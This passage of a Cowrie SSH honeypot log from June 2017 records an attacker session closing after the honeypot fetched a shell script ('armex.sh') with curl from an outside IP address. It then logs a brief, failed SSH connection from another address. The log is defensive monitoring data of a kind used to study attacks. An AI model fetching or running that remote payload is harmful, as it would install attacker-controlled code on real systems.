+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Not storing duplicate content e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688 to dl/e47f7271638dc2830ddde5203bd092ba1bbf1b7a408bd5e0ab7602b421956688
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170607-065854-600104ca-0e.log after 0 seconds
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-07T06:58:54+0000 [HTTPPageDownloader,client] sending close 0
+2017-06-07T06:58:54+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://51.15.48.238/armex.sh>
+2017-06-07T06:58:55+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 59.45.175.56:39836 (10.8.41.81:2222) [session: 1458cab5]
+2017-06-07T06:58:55+0000 [HoneyPotSSHTransport,8728,59.45.175.56] Remote SSH version: SSH-2.0-PUTTY
+2017-06-07T06:58:55+0000 [HoneyPotSSHTransport,8728,59.45.175.56] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-07T06:58:55+0000 [HoneyPotSSHTransport,8728,59.45.175.56] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:55+0000 [HoneyPotSSHTransport,8728,59.45.175.56] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-07T06:58:56+0000 [HoneyPotSSHTransport,8728,59.45.175.56] NEW KEYS
+2017-06-07T06:58:56+0000 [HoneyPotSSHTransport,8728,59.45.175.56] starting service 'ssh-userauth'
+2017-06-07T06:58:57+0000 [HoneyPotSSHTransport,8728,59.45.175.56] Got remote error, code 11
+	reason: 
+2017-06-07T06:58:57+0000 [HoneyPotSSHTransport,8728,59.45.175.56] connection lost
+2017-06-07T06:58:57+0000 [HoneyPotSSHTransport,8728,59.45.175.56] Connection lost after 2 seconds
